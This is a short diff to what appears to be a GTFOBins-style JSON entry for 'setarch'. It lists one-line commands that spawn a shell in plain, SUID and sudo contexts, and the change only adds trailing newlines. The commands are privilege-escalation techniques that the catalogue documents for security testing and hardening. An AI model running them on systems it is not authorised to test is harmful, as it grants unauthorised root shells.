@@ -2,17 +2,20 @@
   "functions": {
     "shell": [
       {
-        "code": "setarch $(arch) /bin/sh"
+        
+        "code": "setarch $(arch) /bin/sh\n"
       }
     ],
     "suid": [
       {
-        "code": "./setarch $(arch) /bin/sh -p"
+        
+        "code": "./setarch $(arch) /bin/sh -p\n"
       }
     ],
     "sudo": [
       {
-        "code": "sudo setarch $(arch) /bin/sh"
+        
+        "code": "sudo setarch $(arch) /bin/sh\n"
       }
     ]
   }
